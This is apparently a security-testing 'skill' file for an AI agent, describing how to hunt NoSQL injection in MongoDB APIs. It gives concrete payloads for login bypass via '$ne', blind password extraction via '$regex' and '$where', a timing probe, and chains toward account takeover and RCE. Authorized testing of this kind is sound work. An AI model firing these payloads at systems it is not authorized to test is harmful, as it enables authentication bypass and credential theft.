---
name: hunt-nosqli
description: "Hunting skill for NoSQL Injection vulnerabilities. MongoDB `$where`, `$ne`, `$regex` injection, blind NoSQL inference, timing-based NoSQL injection. Use when testing API endpoints that interact with MongoDB or other NoSQL databases."
---

# Hunt: NoSQL Injection

## Detection Patterns

### MongoDB $ne (Not Equal)
```
POST /api/login
{"username": {"$ne": null}, "password": {"$ne": null}}
→ Logs in as first user in DB
```

### MongoDB $where
```
POST /api/search
{"$where": "this.password[0] == 'a'"}
→ Blind character-by-character password extraction
```

### MongoDB $regex
```
POST /api/users/search
{"username": {"$regex": ".*"}}
```
Returns all users. Can be used for blind extraction.

### Parameter Injection
```
GET /api/users?username[$ne]=null
GET /api/users?username[$gt]=
```
Query string parameter injection into MongoDB queries.

## Blind Extraction Technique

```
{"username": "admin", "password": {"$regex": "^a.*"}}  → if match
{"username": "admin", "password": {"$regex": "^b.*"}}  → if no match
{"username": "admin", "password": {"$regex": "^a.*"}}  → auth success
```
Increment regex until full password extracted.

## Timing-Based NoSQLi

MongoDB operations can be timed:
```
{"$where": "sleep(5000)"}  → unvalidated $where allows JS execution
```
If response takes ~5s → $where execution confirmed.

## Confirmation Gates
- Auth bypass via `$ne: null` → confirmed + high
- Regex injection extracts data → confirmed + high
- Timing-based injection confirms blind → confirmed + high

## Chain Templates
- NoSQLi + Auth Bypass → login as admin user
- NoSQLi + Password Extraction → full credential dump → ATO
- NoSQLi + `$where` + JS execution → RCE via MongoDB eval
